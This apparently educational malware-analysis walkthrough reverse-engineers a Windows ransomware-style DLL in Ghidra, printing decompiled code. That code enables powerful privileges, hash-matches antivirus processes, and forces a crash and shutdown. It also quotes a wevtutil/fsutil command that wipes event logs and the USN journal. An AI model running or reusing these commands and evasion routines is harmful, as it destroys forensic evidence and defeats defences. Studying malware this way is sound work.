# Analysis warning:

> PDB> Incomplete PDB information (GUID/Signature and/or age) associated with this program.
> Either the program is not a PE, or it was not compiled with debug information.
> Windows x86 PE RTTI Analyzer> Couldn't find type info structure.

This is probably fine since it seems illogical to include debug information with malware.

# Entry Point

No typical main function found. Instead going to entry point function.

`entry` seems to resemble the `DllMain` entry point but is missing the 3rd parameter:

```cpp
undefined4 entry(HMODULE param_1,int param_2){
  if (param_2 == 1) {
    DAT_1001f120 = param_1;
    DisableThreadLibraryCalls(param_1);
  }
  return 1;
}
```

MSDN lists the signature as:

```cpp
BOOL WINAPI DllMain(
  _In_ HINSTANCE hinstDLL,
  _In_ DWORD     fdwReason,
  _In_ LPVOID    lpvReserved
);
```

[MSDN DllMain](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain)

Documentation for the 3rd argument seems to suggest that it can be `NULL` for dynamic loads however.
The body of the function checks for the second argument to be 1, from MSDN this is the constant for `DLL_PROCESS_ATTACH` meaning the DLL is being loaded. 
The first parameter is suggested to be a `HMODULE` and is a handle to the DLL module. By definition `HMODULE` and `HINSTANCE` represent the same data type on Windows versions that are more than 16-bits as can be found in the [Data Types MSDN documentation](https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types).

Given that this is the entry point and we have no more information this being `DllMain` seems reasonable so we're going to input that into Ghidra.

Assuming that the provided `fdwReason` is `DLL_RPOCESS_ATTACH` then it becomes clear that we store a handle to the DLL module and invoke `DisableThreadLibraryCalls`. The latter from [MSDN DisableThreadLibraryCalls](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-disablethreadlibrarycalls) seems to just disable `DLL_THREAD_ATTACH` and `DLL_THREAD_DETACH` notifications though I have no idea what this means. We'll rename the DLL handle field however.

After this the entry point returns `1 (true)` for success.

# The second export

Given that this marks the end of the function we need something more. We know that were are loaded as a DLL. Moreover in Ghidra we can see that the entire DLL only exports two functions. One of them being the entry point we just looked at. A natural next point of investigation is the other exported function, labelled `Ordinal_1` by Ghidra.

# Ordinal_1

The `Ordinal_1` function contains a lot of logic and luckily also a fair few `WINAPI` calls which we should be able to use to deduce the type and purpose of some of the logic. Furthermore, at the end of the function is an infinite while loop that looks interesting. It seems highly likely that this function is the root function of the malware. The signature of the `Ordinal_1` function is as follows.

```cpp
void Ordinal_1(uint param_1,HANDLE param_2,LPCWSTR param_3,HANDLE param_4)
```

Using Ghidra we first check if there are references to this function. Save for external calls, such a call does exist. From a function called `FUN_100094a5` this function also seems to reference our earlier DLL handle and is probably used to load or reload the exported function. For now we'll just remember it.

In order to make it easier to reference stuff I'll also paste down below the raw decompilation result for the `Ordinal_1` function.

```cpp
void Ordinal_1(uint param_1,HANDLE param_2,LPCWSTR param_3,HANDLE param_4){
  uint uVar1;
  BOOL BVar2;
  DWORD dwFlags;
  HANDLE hHeap;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  HANDLE *ppvVar5;
  SIZE_T dwBytes;
  int *lpMem;
  WCHAR local_4a1c [8192];
  WCHAR local_a1c [1023];
  undefined2 local_21e;
  HANDLE local_21c [64];
  _OSVERSIONINFOW local_11c;

  int *local_8;
  
                    /* 0x7deb  1   */
  local_8 = (int *)0x10007df8;
  FUN_10007cc0();
  if (param_4 != (HANDLE)0xffffffff) {
    FUN_10009590(param_1,param_2,param_3);
  }
  Ordinal_115(0x202,&DAT_1001f768);
  DAT_1001f140 = FUN_10007091(0x24,(ULONG_PTR)FUN_10006eda,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xffff);
  DAT_1001f108 = FUN_10007091(8,(ULONG_PTR)FUN_10006c74,(PRTL_CRITICAL_SECTION_DEBUG)FUN_10006caa,
                              0xff);
  DAT_1001f110 = (LPCRITICAL_SECTION)0x0;
  InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_1001f124);
  FUN_10006a2b(param_3);
  if ((DAT_1001f144 & 2) != 0) {
    FUN_1000835e();
    FUN_10008d5a();
  }
  FUN_100084df();
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10007c10,(LPVOID)0x0,0,(LPDWORD)0x0);
  if (((DAT_1001f144 & 2) != 0) && ((DAT_1001f104 & 1) != 0)) {
    FUN_10007545();
  }
  FUN_100070fa();
  if ((DAT_1001f104 & 2) != 0) {
    FUN_10008999(DAT_1001f144 & 6);
  }
  if ((DAT_1001f144 & 4) != 0) {
    DAT_1001f110 = FUN_10007091(4,(ULONG_PTR)FUN_10007ca5,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xff);
    uVar1 = FUN_1000875a((int)local_21c);
    if (uVar1 != 0) {
      ppvVar5 = local_21c;
      param_1 = uVar1;
      do {
        local_8 = (int *)*ppvVar5;
        param_3 = (LPCWSTR)0x0;
        param_2 = (HANDLE)0x0;
        param_3 = (LPCWSTR)CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10009f8e,(LPVOID)0x0,4,
                                        (LPDWORD)0x0);
        if (param_3 == (LPCWSTR)0x0) {
          param_2 = (HANDLE)0x57;
        }
        else {
          BVar2 = SetThreadToken(&param_3,local_8);
          if (BVar2 == 0) {
            param_2 = (HANDLE)GetLastError();
          }
          else {
            dwFlags = ResumeThread(param_3);
            if (dwFlags != 0xffffffff) goto LAB_10007f70;
          }
          CloseHandle(param_3);
        }
LAB_10007f70:
        SetLastError((DWORD)param_2);
        param_2 = *ppvVar5;
        param_3 = (LPCWSTR)0x0;
        param_4 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10007d58,&param_3,4,(LPDWORD)0x0);
        if (param_4 != (HANDLE)0x0) {
          BVar2 = SetThreadToken(&param_4,param_2);
          if (BVar2 != 0) {
            dwFlags = ResumeThread(param_4);
            if (dwFlags == 0xffffffff) {
              GetLastError();
            }
            else {
              WaitForSingleObject(param_4,0xffffffff);
            }
          }
          CloseHandle(param_4);
        }
        if (param_3 != (LPCWSTR)0x0) {
          FUN_10007298(DAT_1001f110,ppvVar5,0);
        }
        ppvVar5 = ppvVar5 + 1;
        param_1 = param_1 - 1;
      } while (param_1 != 0);
    }
  }
  FUN_100070fa();
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_1000a0fe,(LPVOID)0x0,0,(LPDWORD)0x0);
  param_4 = (HANDLE)0x0;
  param_1 = 0;
  param_3 = (LPCWSTR)0x0;
  param_2 = (HANDLE)0x0;
  FUN_10008282((uint *)&param_4,&param_1,(uint *)&param_3,(uint *)&param_2);
  dwBytes = 4;
  dwFlags = 8;
  hHeap = GetProcessHeap();
  local_8 = (int *)HeapAlloc(hHeap,dwFlags,dwBytes);
  if (local_8 != (int *)0x0) {
    *local_8 = (int)param_3 * 60000;
    hHeap = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_1000a274,local_8,0,(LPDWORD)0x0);
    if (hHeap == (HANDLE)0x0) {
      dwFlags = 0;
      lpMem = local_8;
      hHeap = GetProcessHeap();
      HeapFree(hHeap,dwFlags,lpMem);
    }
  }
  Sleep((int)param_4 * 60000);
  if ((DAT_1001f104 & 0x10) != 0) {
    FUN_10001eef();
  }
  Sleep((int)param_2 * 60000);
  if ((DAT_1001f144 & 2) != 0) goto LAB_1000811b;
  memset(&local_11c,0,0x114);
  local_11c.dwOSVersionInfoSize = 0x114;
  BVar2 = GetVersionExW((LPOSVERSIONINFOW)&local_11c);
  if (BVar2 == 0) goto LAB_1000811b;
  if ((local_11c.dwMajorVersion != 5) ||
     ((local_11c.dwMinorVersion != 1 && (local_11c.dwMinorVersion != 2)))) {
    if (local_11c.dwMajorVersion != 6) goto LAB_1000811b;
    if ((local_11c.dwMinorVersion != 0) && (local_11c.dwMinorVersion != 1)) goto LAB_1000811b;
  }
  FUN_10006bb0(local_4a1c);
  iVar3 = FUN_10007d6f(local_4a1c);
  if (iVar3 == 0) goto LAB_1000811b;
  do {
    ExitProcess(0);
LAB_1000811b:
    Sleep(param_1 * 60000);
    wsprintfW(local_a1c,
                            
              L"wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil clApplication & fsutil usn deletejournal /D %c:"
              ,(uint)DAT_1001f148);
    local_21e = 0;
    FUN_100083bd(3);
    if ((DAT_1001f144 & 1) != 0) {
      hModule = GetModuleHandleA("ntdll.dll");
      if ((hModule != (HMODULE)0x0) &&
         (pFVar4 = GetProcAddress(hModule,"NtRaiseHardError"), pFVar4 != (FARPROC)0x0)) {
        (*pFVar4)(0xc0000350,0,0,0,6,&param_3);
      }
      BVar2 = InitiateSystemShutdownExW((LPWSTR)0x0,(LPWSTR)0x0,0,1,1,0x80000000);
      if (BVar2 == 0) {
        ExitWindowsEx(6,0);
      }
    }
  } while( true );
}
```

We skip the variable declarations for now and instead look at `FUN_10007cc0`. 

### FUN_10007cc0

```cpp
void FUN_10007cc0(void){
  BOOL BVar1;
  DWORD DVar2;
  uint uVar3;
  
  if (_DAT_1001f114 == 0) {
    DAT_1001f118 = GetTickCount();
    BVar1 = FUN_100081ba(L"SeShutdownPrivilege");
    uVar3 = (uint)(BVar1 != 0);
    BVar1 = FUN_100081ba(L"SeDebugPrivilege");
    if (BVar1 != 0) {
      uVar3 = uVar3 | 2;
    }
    BVar1 = FUN_100081ba(L"SeTcbPrivilege");
    if (BVar1 != 0) {
      uVar3 = uVar3 | 4;
    }
    DAT_1001f144 = uVar3;
    _DAT_1001f104 = FUN_10008677();
    DVar2 = GetModuleFileNameW(DLL_handle,&DAT_1001f148,0x30c);
    if (DVar2 != 0) {
      FUN_10008acf();
      return;
    }
  }
  return;
}
```

This function checks some datavalue `_DAT_1001f114` against being `0`. After that it calls `GetTickCount()` which from [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount) turns out to return the number of millis since the system was started. Meaning we can rename the data variable that stores it.

Next we see 3 privilege related function calls. The result of which seems to be stored in some global variable. However, lets first look at the fun `FUN_100081ba` function before making assumptions.

### FUN_100081ba

```cpp
BOOL FUN_100081ba(LPCWSTR param_1){
  HANDLE ProcessHandle;
  BOOL BVar1;
  BOOL BVar2;
  DWORD DesiredAccess;
  HANDLE *TokenHandle;
  _TOKEN_PRIVILEGES local_1c;
  DWORD local_c;
  HANDLE local_8;
  
  local_1c.PrivilegeCount = 0;
  local_1c.Privileges[0].Luid.LowPart = 0;
  local_1c.Privileges[0].Luid.HighPart = 0;
  local_1c.Privileges[0].Attributes = 0;
  TokenHandle = &local_8;
  DesiredAccess = 0x28;
  BVar2 = 0;
  local_c = 0;
  local_8 = (HANDLE)0x0;
  ProcessHandle = GetCurrentProcess();
  BVar1 = OpenProcessToken(ProcessHandle,DesiredAccess,TokenHandle);
  if (BVar1 != 0) {
    BVar1 = LookupPrivilegeValueW((LPCWSTR)0x0,param_1,(PLUID)local_1c.Privileges);
    if (BVar1 != 0) {
      local_1c.PrivilegeCount = 1;
      local_1c.Privileges[0].Attributes = 2;
      BVar2 = AdjustTokenPrivileges
                        (local_8,0,(PTOKEN_PRIVILEGES)&local_1c,0,(PTOKEN_PRIVILEGES)0x0,(PDWORD)0x0
                        );
      local_c = GetLastError();
      if (local_c != 0) {
        BVar2 = 0;
      }
    }
  }
  SetLastError(local_c);
  return BVar2;
}
```

The first thing to note is that this function does not call any other non standard functions. 
Secondly we see this function calling [OpenProcessToken](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken) in order to optain the access token for the current process. The access we try to obtain the token with is `0x28` from [the source](https://referencesource.microsoft.com/#System.Workflow.Runtime/DebugEngine/NativeMethods.cs,60ee4c1b376d5f3f,references) we find that this is the combination of `0x20` and `0x08` denoting `TOKEN_QUERY` and `TOKEN_ADJUST_PRIVILEGES`.

Next we see a privilege look up for the `LPCWSTR` that was passed as the function argument. This means we can rename `param_1` to something more descriptive. From the [MSDN documentation for LoopupPrivilegeValueW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew) we find that this gets the `LUID` by which the privilege is known on the system.

If this succeeds then it tries to adjust the token privileges. By setting the attributes of the passed in privilege name to `2`. From [some more research](https://github.com/microsoft/Windows-classic-samples/blob/master/Samples/Win7Samples/winbase/bootconfigurationdata/bcdsamplelib/Utils.cs) we find that this constant maps to `SE_PRIVILEGE_ENABLED`. Meaning this function enables a privilege.

If this operation succeeds the function returns `1 (true)` and otherwise `0 (false)`. This means we can change the function name to something like `grant_privilege`.

Going back to `FUN_10007cc0` we then see that we try to grant the process the `SeShutdownPrivilege`, `SeDebugPrivilege` and `SeTcbPrivilege`. The bitwise combination is then stored in the `DAT_1001f144` global with the priviledes having the values `1`, `2` and `4` (same order as before). This also means we can rename the global.

Next follows yet another function call `FUN_10008677`.

### FUN_10008677

```cpp
uint FUN_10008677(void){
  byte *pbVar1;
  short sVar2;
  int iVar3;
  short *psVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined4 local_23c [9];
  short local_218;
  undefined local_216 [518];
  HANDLE local_10;
  int local_c;
  uint local_8;
  
  local_8 = 0xffffffff;
  local_10 = (HANDLE)CreateToolhelp32Snapshot(2,0);
  if (local_10 != (HANDLE)0xffffffff) {
    local_23c[0] = 0x22c;
    iVar3 = Process32FirstW(local_10,local_23c);
    while (iVar3 != 0) {
      psVar4 = &local_218;
      local_c = 0x12345678;
      uVar7 = 0;
      do {
        sVar2 = *psVar4;
        psVar4 = psVar4 + 1;
      } while (sVar2 != 0);
      uVar5 = (int)((int)psVar4 - (int)local_216) >> 1;
      do {
        uVar6 = 0;
        uVar8 = uVar7;
        if (uVar5 != 0) {
          do {
            pbVar1 = (byte *)((int)&local_c + (uVar8 & 3));
            psVar4 = &local_218 + uVar6;
            uVar6 = uVar6 + 1;
            *pbVar1 = (*(byte *)psVar4 ^ *pbVar1) - 1;
            uVar8 = uVar8 + 1;
          } while (uVar6 < uVar5);
        }
        uVar7 = uVar7 + 1;
      } while (uVar7 < 3);
      if (local_c == 0x2e214b44) {
        local_8 = local_8 & 0xfffffff7;
      }
      else {
        if ((local_c == 0x6403527e) || (local_c == 0x651b3005)) {
          local_8 = local_8 & 0xfffffffb;
        }
      }
      iVar3 = Process32NextW(local_10,local_23c);
    }
    CloseHandle(local_10);
  }
  return local_8;
}
```

First we notice again that there are no non standard calls in this section. The function however looks fairly complicated. The first thing we see is that the process creates a snapshot by invoking [CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) with the `dwFlags` set to `2` and the `th32ProcessID` set to `0`. Presumably these refer to constants. For the `dwFlags` we find that `2` refers to `TH32CS_SNAPPROCESS` which refers to all processes in the system. The value of `0` for `th32ProcessID` turns out to be shorthand for the current process, however it is ignored when the first argument is `TH32CS_SNAPPROCESS` and therefore effectively does nothing. Effectively this means that a snapshot is made of all the running processes.

If the snapshot is made succesfully a handle to the made snapshot is returned. If this failed the value `-1 (0xffffffff)` is returned from the entire function.

Next we see a call to [Process32FirstW](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32firstw). The first passed argument is the newly created snapshot handle. The second argument is a `LPPROCESSENTRY32W` structure. [The documentation](https://docs.microsoft.com/nl-nl/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) for this struture requires the dwSize argument to be set to `sizeof(PROCESSENTRY32)` before use. It seems like Ghidra was not quite able to figure this out and turned it into `local_23c[0] = 0x22c;` instead. For some reason Ghidra failed to parse the `tlhelp32.h` header when I tried to add this. Most likely there is a fix for this, but the it's not too important for now so lets instead just manually add a struct with the fields listed on the MSDN page. Doing so massively improves the quality of the decompilation turning it into:

```cpp
uint FUN_10008677(void){
  byte *pbVar1;
  short sVar2;
  HANDLE handle_snapshot;
  int has_next;
  short *psVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  PROCESSENTRY32 process_entry;
  int local_c;
  uint local_8;
  
  local_8 = 0xffffffff;
  handle_snapshot = (HANDLE)CreateToolhelp32Snapshot(2,0);
  if (handle_snapshot != (HANDLE)0xffffffff) {
                    /* process_entry#dwSize = sizeof(PROCESSENTRY32) */
    process_entry.dwSize = 0x22c;
    has_next = Process32FirstW(handle_snapshot,&process_entry);
    while (has_next != 0) {
      psVar3 = (short *)process_entry.szExeFile;
      local_c = 0x12345678;
      uVar6 = 0;
      do {
        sVar2 = *psVar3;
        psVar3 = psVar3 + 1;
      } while (sVar2 != 0);
      uVar4 = (int)((int)psVar3 - (int)(process_entry.szExeFile + 2)) >> 1;
      do {
        uVar5 = 0;
        uVar7 = uVar6;
        if (uVar4 != 0) {
          do {
            pbVar1 = (byte *)((int)&local_c + (uVar7 & 3));
            has_next = uVar5 * 2;
            uVar5 = uVar5 + 1;
            *pbVar1 = (process_entry.szExeFile[has_next] ^ *pbVar1) - 1;
            uVar7 = uVar7 + 1;
          } while (uVar5 < uVar4);
        }
        uVar6 = uVar6 + 1;
      } while (uVar6 < 3);
      if (local_c == 0x2e214b44) {
        local_8 = local_8 & 0xfffffff7;
      }
      else {
        if ((local_c == 0x6403527e) || (local_c == 0x651b3005)) {
          local_8 = local_8 & 0xfffffffb;
        }
      }
      has_next = Process32NextW(handle_snapshot,&process_entry);
    }
    CloseHandle(handle_snapshot);
  }
  return local_8;
}
```

The actual logic in this function looks fairly complicated. The general idea is clear as it is just going through all of the captured processes in the snapshot. However what exactly this `local_8` variable ends up being is still unclear. We clearly see multiple references to the exe file name of the captured processes. The best bet at this point would be to search online for the various constants we see in the logic `0x12345678`, `0x2e214b44`, `0xfffffff7`, `0x6403527e`, `0x651b3005` and `0xfffffffb`. In hindsight doing this felt like a cheat code... I was expecting these values to represent constants, instead I found out that they represent [hashes of anti virus software](https://gist.github.com/msuiche/cf268fddd16aaa3f67cacc5838d60c1e).

From this we learn the following:
- `0x2e214b44` is the hash of `avp.exe` belonging to Kaspersky    
- `0x651b3005` is the hash of `NS.exe` belonging to Norton Security    
- `0x6403527e` is the hash of `ccSvcHst.exe` belonging to Symantec

Each of these modify the return value. The return value is initially set to `0xffffffff` and is of type `uint`. Each detected anti virus masks this value with a bit mask containing some 0 bits. In the case of Kaspersky this is done using `0xfffffff7` which after converting to binary yields `1111 1111 1111 1111 1111 1111 1111 0111` meaning the 4th bit gets set to 0. In the case of Norton or Symantec the mask `0xfffffffb` is used which yields `1111 1111 1111 1111 1111 1111 1111 1011` in binary meaning the 3rd bit gets set to 0.


This means the function returns a `uint` of all 1's and potentially two bits set to 0 denoting active anti virus software. From this function it is unclear why Kaspersky is treated differently from Norton and Symantec. However we have enough information to rename this function and go up one level. Our final decompilation result for the function ended up as:

```cpp
uint detect_anti_virus(void){
  byte *pbVar1;
  short sVar2;
  HANDLE handle_snapshot;
  int has_next;
  short *psVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  PROCESSENTRY32 process_entry;
  int hash;
  uint ret_val;
  
  ret_val = 0xffffffff;
  handle_snapshot = (HANDLE)CreateToolhelp32Snapshot(2,0);
  if (handle_snapshot != (HANDLE)0xffffffff) {
                    /* process_entry#dwSize = sizeof(PROCESSENTRY32) */
    process_entry.dwSize = 0x22c;
    has_next = Process32FirstW(handle_snapshot,&process_entry);
    while (has_next != 0) {
      psVar3 = (short *)process_entry.szExeFile;
      hash = 0x12345678;
      uVar6 = 0;
      do {
        sVar2 = *psVar3;
        psVar3 = psVar3 + 1;
      } while (sVar2 != 0);
      uVar4 = (int)((int)psVar3 - (int)(process_entry.szExeFile + 2)) >> 1;
      do {
        uVar5 = 0;
        uVar7 = uVar6;
        if (uVar4 != 0) {
          do {
            pbVar1 = (byte *)((int)&hash + (uVar7 & 3));
            has_next = uVar5 * 2;
            uVar5 = uVar5 + 1;
            *pbVar1 = (process_entry.szExeFile[has_next] ^ *pbVar1) - 1;
            uVar7 = uVar7 + 1;
          } while (uVar5 < uVar4);
        }
        uVar6 = uVar6 + 1;
      } while (uVar6 < 3);
      if (hash == 0x2e214b44) {
        ret_val = ret_val & 0xfffffff7;
      }
      else {
        if ((hash == 0x6403527e) || (hash == 0x651b3005)) {
          ret_val = ret_val & 0xfffffffb;
        }
      }
      has_next = Process32NextW(handle_snapshot,&process_entry);
    }
    CloseHandle(handle_snapshot);
  }
  return ret_val;
}
```

Back in `FUN_10007cc0` we can now rename the global storing the result of the anti virus detection. Most likely this will be relevant later on.

The last part of the `FUN_10007cc0` function executes the WINAPI call [GetModuleFileNameW](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamew). This call simply gets the fully qualified path for the passed module handle. Due to our renaming we immediately see that the handle passed is that of the malware DLL. The other two arguments specify a target location to store the fully qualified path and the size of the buffer. This means we can rename the global to something more descriptive.

Next we see the return value of the `GetModuleFileNameW` call being compared to `0`. From the MSDN documentation we know that a return value of `0` means an error occurred. Meaning the function in the `if` is only executed when there was no error so lets investigate this function next.

### FUN_10008acf

```cpp
undefined4 FUN_10008acf(void){
  HANDLE hFile;
  DWORD nNumberOfBytesToRead;
  HANDLE hHeap;
  LPVOID lpBuffer;
  BOOL BVar1;
  DWORD dwFlags;
  DWORD dwBytes;
  undefined4 local_10;
  DWORD local_8;
  
  local_10 = 0;
  hFile = CreateFileW(&dll_fully_qualified_path,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                      (HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    nNumberOfBytesToRead = GetFileSize(hFile,(LPDWORD)0x0);
    if (nNumberOfBytesToRead != 0) {
      dwFlags = 0;
      dwBytes = nNumberOfBytesToRead;
      hHeap = GetProcessHeap();
      lpBuffer = HeapAlloc(hHeap,dwFlags,dwBytes);
      if (lpBuffer != (LPVOID)0x0) {
        local_8 = 0;
        BVar1 = ReadFile(hFile,lpBuffer,nNumberOfBytesToRead,&local_8,(LPOVERLAPPED)0x0);
        if ((BVar1 == 0) && (local_8 == nNumberOfBytesToRead)) {
          nNumberOfBytesToRead = 0;
          hHeap = GetProcessHeap();
          HeapFree(hHeap,nNumberOfBytesToRead,lpBuffer);
        }
        else {
          local_10 = 1;
          DAT_1001f0fc = lpBuffer;
          DAT_1001f11c = nNumberOfBytesToRead;
        }
      }
    }
    CloseHandle(hFile);
  }
  return local_10;
}
```

One of the first things we notice is that the return type is undefined. And we recall that the return type went unused in the calling location. This means that we will probably have to figure out what exactly this type is for our decompilation to reveal more information.

The first thing we see happening in the function is a call to [CreateFileW](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew). The file path passed is the earlier resolved fully qualified path global for the Malware DLL. The desired access mode for the file is set to `0x80000000` which maps to the `GENERIC_READ` constant. The share mode is requested as `1` which maps to the `FILE_SHARE_READ` constants meaning the file can be read at the same time to multiple processes. The `LPSECURITY_ATTRIBUTES` are passed as `NULL` which makes sense because this argument is ignored for files that already exist. The `dwCreationDisposition` argument is passed as `3` which maps to `OPEN_EXISTING` which again makes sense. Next is the `dwFlagsAndAttributes` argument which is passed as `0` whgich basically makes the attributes of the existing file are used as is. The final `hTemplateFile` argument is passed as `NULL` which makes sense because this argument is ignored for existing files. After all this the returned value is an open handle to the passed file path.

As a side note we see that the function simply returns when the file read fails.

If the file read succeeds then we see that we first invoke [GetFileSize](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfilesize) to get the length in bytes of the file. Assuming that this is not 0 we continue.

Next we get the heap of the process by calling [GetProcessHeap](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-getprocessheap). After this we perform a [heap allocation](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc). To do this we use the process heap handle just obtained, do not use any flags and allocate enough space to store the entire Malware DLL in it. Assuming this worked a point to the allocated space is returned. 

After guarding against a `NULL` pointer a [ReadFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile) call is issued which simply read the entire Malware DLL into the just allocated heap space, the number of bytes actually read is stored in `local_8`.

Next there are two branches. If the read failed or did not read the expected number of bytes (the entire DLL) then the allocated space is freed an the function returns. If the the read succeeded then the return value `local_10` is set to `1`, the allocated buffer pointed copied to a global and the number of bytes of this buffer also stored in a global. So next we will rename these globals.

We can now conclude that this function simply copies the malware to memory, meaning we can also rename the function to `copy_malware_dll_to_memory`. The return type is still undefined however seems to be some kind of boolean. Probably it being undefined won't cause any issues afterall.

### Back to FUN_10007cc0 (setup)

We have now investigated all the functions called by this function giving us a clear view of what this function is doing:

```cpp
void setup_privileges_antivirus_malware_copy(void){
  BOOL BVar1;
  DWORD DVar2;
  uint uVar3;
  
                    /* Performs general setup:
                       - sets system startup time
                       - grants privileges
                       - detects anti virus
                       - copies malware to memory */
  if (_DAT_1001f114 == 0) {
    millis_since_system_start = GetTickCount();
    BVar1 = grant_privilege(L"SeShutdownPrivilege");
    uVar3 = (uint)(BVar1 != 0);
    BVar1 = grant_privilege(L"SeDebugPrivilege");
    if (BVar1 != 0) {
      uVar3 = uVar3 | 2;
    }
    BVar1 = grant_privilege(L"SeTcbPrivilege");
    if (BVar1 != 0) {
      uVar3 = uVar3 | 4;
    }
    granted_privileges = uVar3;
                    /* All 1's, bit 4 is 0 for Kaspersky and bit 3 is 0 for Norton/Symantec */
    _detected_anti_virus = detect_anti_virus();
                    /* Fully qualified path for the Malware DLL */
    DVar2 = GetModuleFileNameW(DLL_handle,&dll_fully_qualified_path,0x30c);
    if (DVar2 != 0) {
      copy_malware_dll_to_memory();
      return;
    }
  }
  return;
}
```

In summary this function performs some general setup by:
- setting the system startup time
- granting privileges
- detecting anti virus
- and copying the malware to memory

The purpose of all this is not quite clear yet but we are sure to encounter some of the globals that were set later on.

## Back to Ordinal_1

One of the first things to note after the function we just investigated is that it checks the 4th argument against `0xffffffff`. We also know that it is cast to a `HANDLE`. Furthermore we know that depending on the compiler a `HANDLE` is 32 or 64 bits and Ghidra tells us as general information that the application is using 32 bits Address Size. Meaning it is a `DWORD` and corresponds to `-1`. Some more MSDN searching reveals that this is the constant for `INVALID_HANDLE_VALUE`.

Assuming that the handle is not invalid, then `FUN_10009590` is invoked with the first 3 `Ordinal_1` function arguments.

### FUN_10009590

```cpp
undefined4 FUN_10009590(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  SIZE_T dwSize;
  undefined *puVar1;
  SIZE_T dwSize_00;
  undefined *_Dst;
  int iVar2;
  int iVar3;
  BOOL BVar4;
  void *_Src;
  DWORD local_c;
  SIZE_T local_8;
  
  _Src = DLL_handle;
  if ((_DAT_1001f114 == 0) && (malware_dll_buffer != 0)) {
    dwSize = *(SIZE_T *)(*(int *)((int)DLL_handle + 0x3c) + 0x50 + (int)DLL_handle);
    local_8 = dwSize;
    _Dst = (undefined *)VirtualAlloc((LPVOID)0x0,dwSize,0x1000,4);
    if (_Dst != (undefined *)0x0) {
      DAT_1001f13c = _Dst;
      memcpy(_Dst,_Src,dwSize);
      iVar3 = malware_dll_buffer;
      _Src = (void *)(*(int *)(malware_dll_buffer + 0x3c) + malware_dll_buffer);
      if (((_Src != (void *)0x0) && (*(uint *)((int)_Src + 0xa0) != 0)) &&
         (*(int *)((int)_Src + 0xa4) != 0)) {
        iVar2 = FUN_10009322(_Src,*(uint *)((int)_Src + 0xa0));
        if ((((void *)(iVar2 + iVar3) != (void *)0x0) &&
            (iVar3 = FUN_100091fa((void *)(iVar2 + iVar3),(int)_Dst), iVar3 != 0)) &&
           (iVar3 = FUN_10009286(_Dst), iVar3 != 0)) {
          (*(code *)(_Dst + (int)(FUN_100094a5 + -(int)DLL_handle)))
                    (param_1,param_2,param_3,0xffffffff);
        }
      }
      dwSize_00 = local_8;
      BVar4 = VirtualProtect(_Dst,local_8,4,&local_c);
      puVar1 = _Dst;
      dwSize = dwSize_00;
      if (BVar4 != 0) {
        while (dwSize != 0) {
          *puVar1 = 0;
          puVar1 = puVar1 + 1;
          dwSize = dwSize - 1;
        }
        VirtualFree(_Dst,dwSize_00,0x4000);
      }
    }
  }
  return 0;
}
```

The first thing we notice is that all function arguments are `undefined4` this is strange however since we know the types from `Ordinal_1` they are `uint`, `HANDLE` and `LPCWSTR` so lets change this as it will most likely clean up the decompilation result a fair bit. Which turned out to not be the case. Therefore instead lets just try to go step by step and hopefully the 4 nested functions can provide more clarity.

The first thing to note is that the subroutine requires some global called `_DAT_1001f114` to be `0` and the malware DLL to be loaded in memory.

The first thing we see inside the `if` statement is a mess of pointer arithmetic:

```cpp
dwSize = *(SIZE_T *)(*(int *)((int)DLL_handle + 0x3c) + 0x50 + (int)DLL_handle);
```

Looking at the raw instructions here seems to make a little bit more sense:

```
100095af a1 20 f1        MOV        EAX,[DLL_handle]                                 = ??
         01 10
100095b4 8b 50 3c        MOV        EDX,dword ptr [EAX + 0x3c]
100095b7 53              PUSH       EBX
100095b8 56              PUSH       ESI
100095b9 8b 74 02 50     MOV        ESI,dword ptr [EDX + EAX*0x1 + 0x50]
```

However the purpose remains unclear. Especially the `DLL_handle` being in there twice is odd. So instead we look at the following [VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) call in the hope that it can make this make sense. 

The call allocates `dwSize` of memory in the virtual address space of the calling process. The `fwAllocationType` passed is `0x1000` which maps to the constant `MEM_COMMIT`. The `flProtect` argument is `4` which maps to `PAGE_READWRITE`. Returned is a `LPVOID` pointer to the base address of the reserved memory.

If this pointer is not a `NULL` pointer then we see that it is assigned to a global which we can just rename to `allocated_memory` for right now and add a comment.

